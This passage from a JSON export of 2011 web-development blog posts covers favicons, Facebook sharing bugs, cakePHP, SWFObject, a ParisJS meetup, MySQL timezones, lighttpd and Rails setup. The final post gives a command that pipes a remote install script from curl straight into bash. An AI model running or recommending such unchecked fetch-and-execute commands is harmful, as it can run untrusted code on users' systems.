behavior.</p>\n<p> </p>\n<br />",
  "publish_start": "2011-06-03 12:15:27",
  "slug": "browser-caching-behavior"
}, {
  "id": 286,
  "name": "Take care of that favicon",
  "text": "<p>Even if you are not referencing it in your HTML markup, browsers will try to get a file named <code>/favicon.ico</code> on your server root. Let's see some good practice regarding this file.</p>\n<h4>Make it small</h4>\n<p>The smaller the file, the faster it will get downloaded. As it is a less than important file, we don't want to delay the loading of our page for such a tiny graphic. The default file format for such a file is <code>image/x-icon</code>, meaning the .ico extension.</p>\n<p>I think it's a Microsoft legacy format, but well understood by every browser. Be careful when putting your favicon, don't just find a cool <code>.ico</code> file and drop it here. Icon files are containers, they hold various image format ranging from 16x16 to 512x512.</p>\n<p>You clearly don't need the bigger one and the 16x16 will be highly enough. So, be careful.</p>\n<p>The best way of creating the favicon I've found is to first create it as a <code>.gif</code>, then running ImageMagick upon it. On Linux, this means running</p>\n<pre><code lang=\"sh\">convert favicon.gif -resize 16x16! favicon.ico</code></pre><h4>Make it cacheable</h4>\n<p>This file will be requested by the browser on every request, so you'd better make it cacheable to limit the number of requests.</p>\n<p>Also, note that you can't change the name of the file, <code>favicon.ico</code> will always be fetched.</p>\n<p>I choose to cache mine for a year, like any other static asset. I could have gone for a month, to allow updating them more often but I've never ever changed a favicon, so a year seems better.</p>\n<h4>A note on Safari Win</h4>\n<p>From the tests I've done, almost all browsers behave the same regarding favicon fetching and caching : the fetch it last, and do not issue a Cache-Control:max-age=0 on a refresh to force redownloading it.</p>\n<p>Except Safari Win. It fetch it along other downloads and re-dewnload it on a page refresh.</p>",
  "publish_start": "2011-06-01 12:16:00",
  "slug": "care-favicon"
}, {
  "id": 288,
  "name": "Ghost posting on FB.ui streams",
  "text": "<p>We had a bit of an issue when launching our app a few weeks ago. Everything was working fine on our test apps, but when live, all the stream messages we posted (we call them \"Sharings\") had a random text appended.</p>\n<p>Most of the time it was a generic Facebook text, but sometimes it was a creepier SQL request just displayed plain on the user feed.</p>\n<p>The Facebook text was (for the sake of search engine goodness):</p>\n<blockquote>\n<p>Facebook is a social utility that connects people with friends and  others who work, study and live around them. People use Facebook to keep  up with friends, upload an unlimited number of photos, post links and  videos, and learn more about the people they meet.</p>\n</blockquote>\n<p>As the issue only occurs in production mode and never on any of our test environments, this was pretty difficult to debug.</p>\n<p>Here was the code used to post the Sharing :</p>\n<pre><code lang=\"js\">FB.ui({<br />\t[...],<br />\t'title' : 'Title of the Sharing',<br />\t'caption' : 'Text of the Sharing'<br />});</code></pre>\n<p>As I later found out, the <code>caption </code>key is not supposed to hold the Sharing text. The <code>description </code>key should be used for that. I'm not exactly sure was <code>caption </code>was for, but it seems that if you let the <code>description </code>key empty, then Facebook fills it automatically with a placeholder text.</p>\n<p>The solution simply was to put the text in the <code>description </code>text, and leaving the <code>caption </code>key empty :</p>\n<pre><code lang=\"js\">FB.ui({<br />\t'title' : 'Title of the Sharing',<br />\t'caption' : '',<br />\t'description' : 'Text of the Sharing'<br />});</code></pre>\n<p>As this behaviour is counter-intuitive, undocumented and random, I think posting it here could help other lost souls like me.</p>",
  "publish_start": "2011-06-06 11:24:19",
  "slug": "ghost-posting-fb-ui-streams"
}, {
  "id": 289,
  "name": "Working on Wednesday #2 : Why I want to quit PHP",
  "text": "<p>Here it is : my first Wednesday off. Well, not completely off because I had a technical meeting this whole morning, and my cousin dropped by in the evening so... I finally didn't have as much time reading and learning as I wanted to.</p>\n<p>Anyway, those past weeks I started thinking about what I intended to learn, and why. The main reason is that I want to be able to build website and apps faster, with less hassle and better overall quality. And the more I thought about that, the more it became obvious that PHP was the main bottleneck.</p>\n<h4>My journey accross PHP land</h4>\n<p>I've been writing PHP for the last 12 years. I started as a script kiddy, putting things together, hacking strings, saving stuff in databases, building my own toolbox and finally making websites out of it.</p>\n<p>Then, as I started my first job in a web development company, I started to organize stuff to be able to use and reuse code accross projects.</p>\n<p>Later, when I started as a freelancer, I learned cakePHP, and it let me much more time to focus on each project while still reusing the common code of previous projects easily.</p>\n<h4>PHP is just so easy</h4>\n<p>I can be considered a PHP coder. I have some years of experience to consolidate that. Nevertheless, I don't consider myself \"good\" at PHP. I just write PHP, and that's all.</p>\n<p>I think there isn't any flavour in writing PHP : it is so easy anyone can do it. I don't feel like I know those special stuff that can make one an \"expert\". PHP just feels so easy, you just write code and it works.</p>\n<p>The only area where I can think that my years of experience can be used is in tracking PHP bug or weird error messages (If you haven't <a href=\"http://www.phpsadness.com/\" target=\"_blank\">read this website</a>, go now).</p>\n<p>It just does not feel right to be able to say <em>\"Yeah, you should work with me. Why ? Because my strength is that I'm very good at understanding PHP bugs\".</em></p>\n<p>There is no \"PHP Philosophy\", no good practices that were kept in mind by PHP lead developers when they wrote the language and they wanted us to follow. Instead, we just have a bunch of functions, and play with it as in a sandbox.</p>\n<h4>Adding some pattern in this mess</h4>\n<p>Over the years you learn (the hard way) how to organise your code. PHP5 gives a little hope by adding more OO features. No need to get back on the namespace delimiter choice, this is one more example of the PHP weirdness we'll have to work with.</p>\n<p>The best thing that happened to me in PHP world over those years is cakePHP. It took me quite some time to get it, having to learn the whole MVC pattern (and deal with some of cake internal inconsistencies/limitations) but the result was worth it.</p>\n<p>A clear separation of model structure, controller logic and view rendering gave me my sanity back. I does abstract a lot of things, and makes things cleaner on the outside, you can just concentrate on writing your app code.</p>\n<p>But even with cakePHP, you still have to write PHP.</p>\n<h4>Summing up</h4>\n<p>So, to sum up, here are my feelings about PHP</p>\n<ul>\n<li>No peculiar love for the PHP syntax and (non-)patterns</li>\n<li>Growing list of bugs/inconsistencies you have to work with</li>\n<li>Don't feel like I'm any better than any new PHP coder, no skill required</li>\n<li>Best thing in PHP is cakePHP, an external framework</li>\n</ul>\n<p>That's why PHP is the first language I'll drop in my new learning, and I'll replace it with Ruby.</p>\n<p>Ruby seems to fit more in my vision of a language that tells its developers what are the good and bad way of writing code. And as cakePHP is largely based upon Rails, I think catching up won't be too difficult.</p>\n<p>Also, Rails just realease it's version 3, so now the best time to learn it from scratch.</p>\n<h4>Next week</h4>\n<p>This first day off was much shorter than I expected it to be. I wanted to start coding some Rails code, following the Rails for Zombies tutorial. I also had plans for using vim a little more.</p>\n<p>Next week I might write about vim, or maybe how to organize javascript code, depending on the time I had.</p>",
  "publish_start": "2011-06-15 19:27:49",
  "slug": "working-wednesday-2-quit-php"
}, {
  "id": 290,
  "name": "cakePHP : Fatal error: Class 'Controller' not found",
  "text": "<p>Last Friday, just before turning off my computer and going home, the cake project I'm working on was displaying a scary <code>Fatal error:  Class 'Controller' not found in /var/www/project/app/app_controller.php on line 5</code></p>\n<p>Today, I'm getting back to work and here's what happened. After a morning of trial and error, I finally reverted back to a previous svn commit, then re-updated to the latest one and it seemed to solve the issue.</p>\n<p>But later on the day, after another update, it started bugging again and the error message wasn't very helpful.</p>\n<p>After much googling, this <a title=\"Class 'Controller' not found\" href=\"http://cakephp.lighthouseapp.com/projects/43067/tickets/26-class-controller-not-found\" target=\"_blank\">bug report</a> gave me a hint : I had new models but didn't create the corresponding tables. Strangely, creating the missing logs table for my Log class solved the issue.</p>\n<p>Hope this blog post will be usefull for anyone else struggling with this error message.</p>\n<br />",
  "publish_start": "2011-06-20 10:21:58",
  "slug": "cakephp-fatal-error-class-controller"
}, {
  "id": 291,
  "name": "Working on Wednesday #3 : The long path to get it done",
  "text": "<p>This morning I started reading a lot of online blog post, framework description and other webdev material online I had in my bookmarks. After reading them, I saved them on my pinboard account to find them easily later.</p>\n<p>Lot of good JS and CSS framework/libraries in there, I hope to be able to test them soon.</p>\n<p>I also check my mailbox and respond to mails from my normal job. I shouldn't. I'm on a day off, I have to force myself to completly cut out those external calls.</p>\n<h4>Now, let's the work begin</h4>\n<p>Anyway, I finally finished the vimtutor. I still have a some difficulties to remember the mapping of the basic hjkl movement keys (I always want use k to move down instead of j). However, I feel confident enough in it to try writing my new code in it.</p>\n<p>So, I headed to the Rails for Zombies tutorial. I thought it was free but the \"win $5 worth of online teaching\" / \"next course costs $5\" make me doubt it a little. Well, we'll see.</p>\n<p>After registering to it, I wanted to save my login and password to KeePass as I always do.</p>\n<p>Unfortunatly, KeePass on my Ubuntu machine works by using mono, and the keyboard interaction weren't that good (caret is slightly misplaced, inputs lags before getting displayed, text selection is weird). So I thought \"Hey, let's see if there is a new version\". Big mistake.</p>\n<p>It appears that there was indeed a new version, a real one, with <code>apt-get</code> and stuff while mine was some hackish install I manually made a few month ago.</p>\n<p>But wait, this means manually adding a ppa directory. No big deal, I trust the author. What ? Still doesn't work ? Hmm, I see. I need <code>mono</code> 2.6, and I only have 2.4.</p>\n<p>What ? 2.4 is the latest available version on Ubuntu 10.10 ? You mean I must upgrade to 11.04 ? Hmm. Why not. I'll have to do it eventually, so let's go.</p>\n<p>So I ran all my updates, to have the most up to date system. Unfortunatly, <code>language-pack-gnome-fr</code> doesn't want to upgrade so the OS upgrade isn't displayed.</p>\n<h4>Wait, what am I doing ?</h4>\n<p>And that's when I remember that my initial wish was to learn Ruby on Rails and that I was now on the road to upgrading my whole operating system. That is not exactly speaking procrastination, but it makes me do so much other things that my initial goal that I really looks like it.</p>\n<p>I finally managed to purge my packets, upgrade to 10.10 and then to 11.04. But this took me 4 hours, and now it's 11PM and I guess I won't start this rails tutorial today, after all.</p>",
  "publish_start": "2011-06-22 18:56:35",
  "slug": "working-wednesday-3-long-path"
}, {
  "id": 292,
  "name": "SWFObject must be included in the <head>",
  "text": "<p>We just discovered a strange behavior on one of our test VM (one without Flash installed). I don't know how we've missed it before.</p>\n<p>When embedding the main flash file of our application, the alternate content wasn't displayed to players. In fact it seemed to be displayed very briefly then disappear.</p>\n<p>I had correctly embeded it with the static publishing method and added a call to <code>swfobject.registerObject</code> to soften the edges. I remembered it working correctly in my tests, so I quickly made a small test case.</p>\n<p>It occurs that the alternate content was corretcly displayed if I removed the <code>swfobject.registerObject</code> call and only used the static publishing.</p>\n<p>I also found that everything worked fine if I called the <code>swfobject.js</code> file in the <code>head</code>, but started to bug when I moved it at the end of the page.</p>\n<p>As I didn't want to add a call to a .js file in my <code>head</code>, I google a bit and I finally found that one have to call <code>swfobject.switchOffAutoHideShow();</code> right before the<code> swfobject.registerObject</code> call. This seems to fix things by not hiding the alternate text</p>\n<h4>Edit</h4>\n<p>I spent some more hours trying to debug the last corner cases. We had a user using Firefox 3.5.3 with Flash 10.0.42.34. Using SWFObject, we required at least version 10.1. Unfortunatly, the app was still loading, but was buggy because of features not present in the user flash version.</p>\n<p>After some tests, I discovered that the <code>swfobject.js</code> code MUST be included in the <code>&lt;head&gt;</code> of the document (well, before any <code>.swf</code> in the page, so better put it in the <code>&lt;head&gt;</code>).</p>\n<p>Doing so, you won't even need the previous fix (<code>swfobject.switchOffAutoHideShow()</code>).</p>\n<p>I would have loved putting it at the end of the page, with the others JS files, but I guess I won't have a choice here.</p>",
  "publish_start": "2011-06-23 16:29:39",
  "slug": "swfobject-display-alternate-content-head"
}, {
  "id": 293,
  "name": "Alternate content with SWFObject",
  "text": "<p>SWFObject allow a web developer to add an alternate content in place of the <code>swf</code> file is the user doesn't have flash installed.</p>\n<p>In the case of a web app this is great to provide your user with a link to the Adobe website. You then tell your users Flash is needed and provide a link for them to install it.</p>\n<p>Unfortunatly, if for one reason or another the <code>swf</code> file you try to load is unreachable (maybe your host is down ?), SWFObject will display the same alternate content. Meaning that a user with a perfectly correct Flash version will see an error message telling him that he does not have Flash when in fact the error is on your side.</p>\n<p>That's not very user friendly and makes you look bad.</p>\n<p>So, to fix this, I added two error messages as alternate content :</p>\n<pre><code lang=\"html\">&lt;div id=\"alternateContent\" class=\"alternateContent\"&gt;<br />\t&lt;div class=\"noFlash message\"&gt;It seems that you do not have the Flash player installed. Please install it, by &lt;a href=\"http://www.adobe.com/go/getflashplayer\" target=\"_parent\"&gt;following this link&lt;/a&gt;.&lt;/div&gt;<br />\t&lt;div class=\"error404 message\"&gt;Sorry, we were unable to load the game. Please try again in a few moments.&lt;/div&gt;<br />&lt;/div&gt;</code></pre>\n<p>Then, in CSS I decided to hide them both :</p>\n<pre><code lang=\"css\">.alternateContent .message { display:none; }<br />.alternateContent.noFlash .noFlash { display:block; }<br />.alternateContent.error404 .error404 { display:block; }</code></pre>\n<p>And finally, in Javascript I checked for the current Flash version. If it's equal to zero, it means that Flash is not installed, so I display the <code>noFlash </code>error message, otherwise, I guess it's a 404 error and display the other message.</p>\n<pre><code lang=\"js\">var flashVersion = swfobject.getFlashPlayerVersion(),<br />\talternateContent = $('#alternateContent')<br />;<br />// Displaying one message or the other<br />if (flashVersion.minor=='0') {<br />\talternateContent.addClass('noFlash');<br />} else {<br />\talternateContent.addClass('error404');<br />}</code></pre>\n<p>This is not bulletproof : I only test for two cases. And a better solution would also have been to put the error message dynamically using Javascript instead of polluting the HTML markup with contradictory text.</p>",
  "publish_start": "2011-06-27 19:19:59",
  "slug": "alternate-content-swfobject"
}, {
  "id": 294,
  "name": "Working on Wednesday #4 : Rails for Zombies",
  "text": "<p> </p>\n<p>(I finally managed to update Ubuntu to the 10.10 version, configure Unity to make it more usable, and I'm not ready to start the RoR tutorial I wanted to start last week.)</p>\n<p>I used <code>vim</code> this week (instead of <code>nano</code>) for very simple file editing. I will force myself to use only <code>vim</code> on wednesday to really learn it. I plan to completly drop Komodo Edit once I'll be familar enough with vim to gain more time than I lose.</p>\n<h4>Rails for Zombies</h4>\n<p>Anyway. I finally get to start the Rails for Zombies tutorial. And here is what I learned.</p>\n<p>There are two distinct things I'm going to learn here : Ruby and Rails. I discovered that I was already familiar with a lot of basic concepts of Rails, thanks to cakePHP. Model and table convention, model relationships (belongs to, has many, etc) were exactly the same.</p>\n<p>Ruby on the other hand was new. But also very interesting. No need to add <code>()</code> after a method to call it when no args are passed, possibility to chain method of the same object (much like jQuery) and the use of dynamic (yet strongly typed) vars.</p>\n<p>The first part of the tutorial (basic CRUD) was easy. I didn't find how to make a complex SQL query like this (cake) one :</p>\n<pre><code lang=\"php\">$Zombie-&gt;find('all', array(<br />'order' =&gt; array('Zombie.graveyard' =&gt; 'ASC', 'Zombie.name' =&gt; 'DESC'<br />));<br /></code></pre>\n<p>I guess it's just a matter of time before I learn how to to do in Rails anyway. I saw that there was more \"advanced\" method (much like the cake <code>find</code> method) that would surely allow such finding.</p>\n<h4>Part 2 : Validation and Relationships</h4>\n<p>The second part of the tutorial was more about models. Validation rules were pretty much the same as those of cakePHP. But the Ruby syntax makes it more concise.</p>\n<p>I couldn't find how to retrieve the validation errors when saving an object using the <code>create</code> method (no problem when manually calling <code>save</code>, though).</p>\n<p>I enjoyed being able to create binded instances by simply adding the binded element to the model. Not very clear isn't it ? Here some code to explain it better. The last two lines have exactly the same effect :</p>\n<pre><code lang=\"php\">class Zombie &lt; ActiveRecord::Base<br />end<br />class Weapon &lt; ActiveRecord::Base<br />belongs_to :zombie<br />end<br />Weapon.create(:name =&gt; \"Rocket Launcher\", :zombie_id =&gt; 2)<br />Weapon.create(:name =&gt; \"Rocket Launcher\", :zombie =&gt; Zombie.find(2))</code></pre>\n<p>Later on, I had to select all weapons binded to a specific Zombie. I was able to find the a specific zombie using any of the two following commands :</p>\n<pre><code lang=\"php\">z = Zombie.where(:name =&gt; \"Ash\").first<br />z = Zombie.find(:first, :conditions =&gt; { :name =&gt; \"Ash\" })</code></pre>\n<p>Then, I wanted to find the weapons binded to this zombie. First I tried the following command :</p>\n<pre><code lang=\"php\">Weapon.where(:zombie_id =&gt; z.id)</code></pre>\n<p>Obviously, this worked. But I wanted to test some more of the Rails magic. So I tried something along the lines of what I did in the previous chapter and tried to use my <code>z</code> var directly instead of <code>z.id</code>.</p>\n<pre><code lang=\"php\">Weapon.where(:zombie =&gt; z)</code></pre>\n<p>This didn't worked. Well, I guess I'll also learn why later one. But one even more weird thing is that the following command did work even I'm not really sur why ?</p>\n<pre><code lang=\"php\">Weapon.where(:zombie_id =&gt; z)</code></pre>\n<p>That's all I did today (well I also did some more Mercurial an Dingux testing, but I that wasn't really work)</p>\n<br />",
  "publish_start": "2011-06-29 14:51:33",
  "slug": "working-wednesday-4-rails-zombies"
}, {
  "id": 295,
  "name": "ParisJS #8",
  "text": "<p><em>(The whole conferences were in french, but as I'm writing every post on my blog in english, I'll write this one too.)</em></p>\n<p>Tonight I was attenting the 8th parisjs meetup. We had the chance to have it hosted at Valtech, in a very wealthy part of Paris, in somptuous quarters and a large room with giant screen (and great pizzas too).</p>\n<p>Anyway, this time the meetup was split in two : first part was made of complete talks, while second part only had small lightning talks. With pizza and beer in between.</p>\n<h4>Wakanda</h4>\n<p>The first talk was about <a href=\"http://www.wakanda.org/\" target=\"_blank\">Wakanda</a>. Wakanda is a complete suite of client/server Javascript which goal is to help create business oriented apps. It is created by the same company as 4D, but this time is completly open source.</p>\n<p>The product seemed well done, but kinda monolithic : server side js, client side javascript framework, application studio, debugguer.</p>\n<p>I can surely see it used for creating Intranet applications, for some very specific business cases. I have an ambiguous feeling about Wakanda. I think they did a very good job, the whole package seems really neat, the IDE is clear, client/server communication is smooth, etc. On the other hand I'm always suspicious of apps that can do everything.</p>\n<p><em>(Note that I didn't try the product, I only heard about it tonight for the first time and watched a 20min presentation so that's a little light for me to give a precise opinion)</em></p>\n<h4>Joshfire Framework</h4>\n<p>A few months ago, <a href=\"http://twitter.com/sylvinus\" target=\"_blank\">@sylvinus</a> from <a href=\"http://joshfire.com/\" target=\"_blank\">Joshfire</a> told us that they planned to realease their framework, modeslty named <a href=\"http://framework.joshfire.com/\" target=\"_blank\">Joshfire</a>.</p>\n<p>This is by far the most interesting presentation of the meetup. Joshfire is a javascript framework aimed at working seamlessly between any devices : desktop, mobile, iPad, TV, anything.</p>\n<p>It's basic idea is to abstract to its bare bone any interaction. From what I remember, for any \"page\" you want to define you have to write two JSON structures.</p>\n<p>One defines the data tree (what your data is), the other defines the UI tree (how your data can be interacted with). It also ships with some adapters (an adapter is the link between the UI Tree and a specific device).</p>\n<p>All you have to do to port your Joshfire app to a new device is to write (or grab if it already exists) an adapter. The main logic and data code is the same for every device, the maintenance is now only focused on any specific device.</p>\n<p>Even if the main idea of Joshfire is awesome, their documentation and licensing is even more awesome : the project is already completly documented, with examples and is also completly free and <a href=\"https://github.com/joshfire/joshfire-framework\" target=\"_blank\">available on github</a>.</p>\n<h4>CSON, no sorry, JISON</h4>\n<p><a href=\"http://twitter.com/jie\" target=\"_blank\">@jie</a> was supposed to talk about CSON, a compressed JSON. But as he already gave a very similar talk (about BSON) at the last #parisnode event, he changed the subject.</p>\n<p>I'm not really sure what the real subject of the talk was. I think he mentionned compiling Javascript into Javascript (much like CoffeeScript), but it eventually turned into a Jison demo.</p>\n<p>Jison seems to be a tool for automating lexing and parsing languages, to output new code. In effect, this could allow for transforming a custom language into an existing language. CoffeeScript, Haml or Sass works that way : they take a new language as input, and return Js, Html or Css as output.</p>\n<p>The advantages are that the custom language is usually much more concise, easy to write and easy to read.</p>\n<p>Anyway, this presentation was full of nice quotes :</p>\n<blockquote cite=\"http://www.pixelastic.com/when%20demonstrating%20the%20usefulness%20of%20Jison\">\n<p>The language I'm about to show you is totally useless.</p>\n</blockquote>\n<blockquote cite=\"http://www.pixelastic.com/answering%20one%20of%20the%20audience%20questions\">\n<p>Pipe ? What is that ? Oh, you mean the strokes.</p>\n</blockquote>\n<blockquote cite=\"http://www.pixelastic.com/about%20Jison\">\n<p>The bad thing about Jison is that its documentation is crap</p>\n</blockquote>\n<blockquote cite=\"http://www.pixelastic.com/when%20doing%20a%20live%20demo\">\n<p>Why does it work ? It was supposed to fail !</p>\n</blockquote>\n<h4>Overview of a dev life</h4>\n<p>This talk wasn't about any new shiny technology. It was about those old browsers and bad habits we had 10 years ago, and how we still managed to make great websites.</p>\n<p>This remind me of the \"good ol' days\" when I discovered the web with FrontPage and ClaraSoft. When IE6 was considered a modern browser.</p>\n<p><a href=\"http://twitter.com/molokoloco\">@molokoloco</a> show us that he managed to simulate ajax using nested iframe, had a website still online and running even after 10 years, was able to code full websites in 3 days, and had read more than 50.000 blog posts. And all that while still using Windows and Dreamweaver.</p>\n<p><em>(Small side note : I praise both @molokoloco and @jie for what they managed to do. I know how easy it is to procrastinate and configure UI, test new tools and IDE instead of getting things done. That didn't seem to be an issue for them.)</em></p>\n<h4>mongoDB</h4>\n<p>This talk was the first in the serie of lightning talks (less than 20mn). It was about mongoDB and how to integrate it in a nodejs app.</p>\n<p>As I had never tried nor nodejs nor mongoDB I didn't quite grasp what it was really about. All I get is that in order to get a result from a mongoDB query, one have to go through 3 steps of connection to the DB. In the asynchronous world of nodejs, this doesn't work well, so each step has to fire a callback once executed.</p>\n<p>From there, I was lost. There was something about manually calling a callback once initialized, but honestly I didn't get it.</p>\n<p>Anyway, I learned from a small talk during pizza time that mongoDB was better than couchDB (performance-wise), and that one have to sacrifice binding to the altar of redundancy to get really fast response time.</p>\n<h4>Audio demo in less than 1kB. No, 800B. No, wait, 200B</h4>\n<p>This time the talk was a very fun demo. Using some simple minification techniques, Js was able to play a random music.</p>\n<p>This involved encoding the wav file in base64 (taking special care of some chars), and then playing it in an audio tag. Adding a bit of random to play a different note on each loop.</p>\n<p>Fun, but interesting.</p>\n<h4>Some words about the Observer Pattern</h4>\n<p>This talk was more about theory than practice. Maybe it was the late hour, but it didn't catch my attention as the other did. Maybe someone would re-explain it to me ?</p>\n<p>Well, I got the general idea : coding a js snippet that hard code the name of the elements that should react is bad practice because of the maintanability nightmare it cause when elements are removed.</p>\n<p>Instead, the speaker advocate the use of a MessageBroker. Some kind of general listener that then dispatch event to element registered to that event (am I right ?).</p>\n<p>Then someone in the audience noted that the opposite pattern should work better : that every element registered itself to an event and react when such event is fired (am I still right ?)</p>\n<p>Honestly, I really am not sure about this talk, so if anyone could fill the blanks and correct me, I'd be glad.</p>\n<h4>Sencha and Sencha Touch</h4>\n<p>I won't go into too much detail on that talk. This was a generic presentation of Sencha (formerly known as ExtJs). I already had the basic understanding of ExtJs (but not the expertise of some of the ExtJs experts in the room), so I was really only half listening.</p>\n<p>Sencha is a great product. It is very similar to what Wakanda was showing in the first talk. It is destined to data-heavy applications with lots of numbers, columns, charts, pies, etc.</p>\n<p>Sencha Touch is a mobile version of Sencha. It is iOS oriented and emulate the standard UI elements in HTML.</p>\n<h4>Mozilla Labs</h4>\n<p>A quick list of the Mozilla Labs projects. I honestly don't remember them all, except Tilt that is a 3D viewer of any web page. It simply calculate the DOM depth and create a pyramid-like structure that you can browser in 3D.</p>\n<p>I'm sure that beyond the cool and shiny aspect, it can be useful as a debug/optimisation tool.</p>\n<h4>Conclusion</h4>\n<p>Once again, thanks to #parisjs for those talks, always inspiring and a way to meet new people.</p>\n<p><em>For all the new readers, I have an unfixed bug in my comment section : your post can be invalidated if your are using Chrome with an email auto-filler. My custom anti-spam will flag you as spam because Chrome fills an hidden honeypot field.</em></p>",
  "publish_start": "2011-06-30 00:45:34",
  "slug": "parisjs-8"
}, {
  "id": 296,
  "name": "Incorrect MySQL date",
  "text": "<p>Several ingame time calculation we made in game are based on Paris time. Some weeks ago, we decided to make a pass on all our servers to always use Paris Time (GMT +1).</p>\n<p>Today, I spotted that logs we save in the DB have some date inaccuracy. It appears that our mysql server and instances weren't always updated to the correct date. Some hours later, here is what I learned :</p>\n<h4>Finding and updating MySQL date</h4>\n<p>You can tell what timezone mysql should use when you start the service. If you don't specify anything, it will use the system time. Once loaded, you can get its time by running <code>SELECT NOW()</code>.</p>\n<p>This is the easiest way to spot errors.</p>\n<p>To know the defined timezone, run <code>SELECT @@global.time_zone</code>. If not defined, you'll read <code>SYSTEM</code>, which is not very helpful.</p>\n<p>Note here that even if you changed the system date AFTER you started mysql, mysql will still use the date that was in effect when you first launched it.</p>\n<p>It means that changing your server time will not affet running mysql processes. You'll have to restart mysql to do that : <code>sudo /etc/init.d/mysql restart</code></p>\n<h4>Finding and updating the server date</h4>\n<p>Even after restarting mysql on some servers, the mysql date was still incorrect. After connecting the the sql server, I found that it was the server time that was incorrectly set (I just type <code>date</code>).</p>\n<p>To update the current time zone, I had to call <code>sudo dpkg-reconfigure tzdata</code> (I'm using ubuntu) and choose the correct city</p>\n<h4>Updating mysql running through ndb_mgm</h4>\n<p>I'm no server expert, so this part was a little trickier. Some of our databases are using ndb cluster for replication. Reloading those configurations was harder.</p>\n<p>First, I had to connect to the server running the ndb management and call <code>ndb_mgm</code>. In the later prompt, I typed show and this get me the list of all servers currently managed.</p>\n<p>I then shut them down typing <code>shutdown</code>.</p>\n<p>The, I reloaded the management and the node running on this server by doing <code>sudo /etc/init.d/mysql-ndb-mgm restart</code> and <code>sudo /etc/init.d/mysql-ndb restart</code></p>\n<p>Finally, I had to connect to all the servers I saw earlier (with the show command) and run <code>sudo /etc/init.d/mysql-ndb restart </code>on each of them</p>",
  "publish_start": "2011-07-04 12:40:12",
  "slug": "incorrect-mysql-date"
}, {
  "id": 297,
  "name": "Using environment vars in lighttpd config files",
  "text": "<p>Our game is hosted on a farm of servers behind a load balancer. All servers are identical except for their names (<code>prod-01</code>, <code>prod-02</code>, etc) and virtual IP addresses.</p>\n<p>In PHP, if I try to access <code>$_SERVER['SERVER_NAME']</code>, I only got the domain name \"prod.game.com\". Actually, this was exactly the same var as the <code>$_SERVER['HTTP_HOST']</code>.</p>\n<p>For logging purposes, I needed to know the name of the server that my script was currently running on. So I updated my <code>lighttpd.conf</code></p>\n<p>Lighty has a feature called <code>include_shell</code> that you can use in its config files. It will basically run a shell script and add its output to your file.</p>\n<p>So I wrote a simple shell script to define a <code>var.serverName</code> (this is a custom value, name it as you want, but keep the <code>var</code> prefix) and then re-use when needed.</p>\n<pre><code lang=\"sh\">#!/bin/bash<br />echo 'var.serverName=\"'$(uname -n)'\"'</code></pre>\n<p>Then, I included it in my <code>lighttpd.conf</code> file using <code>include_shell \"/etc/lighttpd/scripts/serverName.sh\"</code></p>\n<p>To define the PHP SERVER_NAME value :</p>\n<pre><code lang=\"ini\">setenv.add-environment = (<br />\t\"SERVER_NAME\" =&gt; var.serverName<br />)</code></pre>\n<p>To add it as a Server: response Header :</p>\n<pre><code lang=\"ini\">server.tag = var.serverName</code></pre>\n<p>Note that <code>include_shell</code> directives are only called when you start lighty and not on every request.</p>",
  "publish_start": "2011-07-05 19:07:34",
  "slug": "environment-vars-lighttpd-config-files"
}, {
  "id": 298,
  "name": "Working on Wednesday #5 : Rails documentation and Zombies",
  "text": "<p>Today I continue on my Rails for Zombie learning. Actually, I wake up kind of late (11am), had to deal with noisy neighbors and make some shopping before being really able to start working. It's 2pm now, and I just open my browser.</p>\n<h4>Back to Zombies</h4>\n<p>I like the clean syntax Ruby provides. I like being able to pass custom parameters without having to care about the order. This could be achieved in cakePHP using array for options, but is much more clean the Ruby way, using <code lang=\"sh\">truncate(zombie.graveyard, :length =&gt; 10, :omission =&gt; '')</code></p>\n<p>Also the <code lang=\"sh\">link_to</code> and <code>new_{Model}_path</code>, <code>edit_{Model}_path</code> are clever and allow easy access to the link you always use. This force you to logically organise your app.</p>\n<p>The way Rails controllers pass vars to the view (using <code lang=\"sh\">@</code>) is also cleaner than the cakePHP <code>set</code> method. I love those little things the language permits.</p>\n<p><code lang=\"sh\">before_filter</code> also seems more powerful than in cake world, being able to define several of them and restrict them to certain action. Could be extended (I guess) to an ApplicationController that could check on <code>show</code>, <code>edit</code>, etc that the specified id exists and display an error message if not.</p>\n<p>I didn't quite get the various <code lang=\"sh\">respond_as</code> for JSON and XML. Why should I have to pass the <code>@tweet</code> while I don't have to for the html view ?</p>\n<p>Also, the Rails routings system is more appealing to me than its cakePHP counterpart. I would have loved to have such a nice tutorial for cake when I learned it. Routing is very well explained in Rails for Zombies.</p>\n<p>After completing the Zombie tutorial, I headed to the famous blog tutorial every web language should have. Once again, I started reading the doc and a few things caught my attention as very promising :</p>\n<h4>Command line interface</h4>\n<p>I like the way one can create a new app simply with one command line. Such feature is also provided by cakePHP but I never managed to make it work the way I wanted to. That might have been influenced by the fact that I was working on Windows at that time.</p>\n<h4>Directory structure</h4>\n<p>I also note that a Rail application seems greatly structured : there are spaces defined for documentation, tests, database migration, dependencies, logs, deployment scripts and so on.</p>\n<h4>Databases</h4>\n<p>This is great that Rails directly provides two distinct DB configurations : development and production. I will no longer have to do it myself.</p>\n<p>Rails also uses SQLite3 as the default database for development. As I wasn't very familiar with this technology, I made some researchs. Turns out that SQLite is a very simple DB system, perfectlynsuited for the development period as it does not require a DB server.</p>",
  "publish_start": "2011-07-06 14:25:14",
  "slug": "working-wednesday-5-rails-documentation-zombies"
}, {
  "id": 299,
  "name": "Working on Wednesday #6-#7 : Correctly installing Ruby on Rails",
  "text": "<p><em>This post spans two weeks because I couldn't manage to have a clean Ruby/Rails install on my first try. I read a lot, installed ruby using various methods, but finally managed to get it to work corretly. </em></p>\n<h4>Cleaning up</h4>\n<p>First of all, you have to remove any ruby version you might have already installed, just to be sure.</p>\n<pre><code lang=\"sh\">sudo apt-get remove ruby &amp;&amp; sudo apt-get autoremove</code></pre><h4>Installing RVM</h4>\n<p>Then, you have to install RVM before installing Ruby. My biggest mistake in my various shots at installing Ruby was to install RVM last.</p>\n<p>RVM is a very important part of the whole Ruby process. This is a little piece of genius that allow you to create Ruby sandboxes. You can install various Ruby versions side by side, even various gem versions and you simply tell RVM which sandbox you want to use.</p>\n<p>If you are absolutly positive that you will never ever work on more than one Ruby project in your entire life, you can skip installing RVM and simply install Ruby globally on your system. But you know that this will never happen, so, avoid future troubles and install RVM first.</p>\n<p>To install RVM, simply execute the following command</p>\n<pre><code lang=\"sh\">bash &lt; &lt;(curl -s https://rvm.beginrescueend.com/install/rvm)</code></pre><p>This will download and execute the install script. Once it's finished, edit your <code>.bashrc</code> or <code>.zshrc</code> to include the rvm config 